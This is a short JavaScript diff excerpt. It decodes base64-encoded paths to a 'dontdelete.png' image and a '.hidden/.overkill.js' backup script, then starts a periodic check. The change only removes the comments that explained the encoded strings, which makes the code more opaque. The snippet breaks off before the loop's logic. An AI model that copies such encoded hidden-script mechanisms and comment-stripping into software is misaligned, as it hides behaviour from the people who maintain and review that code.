@@ -188,8 +188,8 @@ try {
     (function(){
       let d = s => atob(s);
   
-      let filePath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); // dontdelete.png path
-      let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM="); // .hidden/.overkill.js
+      let filePath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); 
+      let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
   
       setInterval(() => {
           let imgTest = new Image();
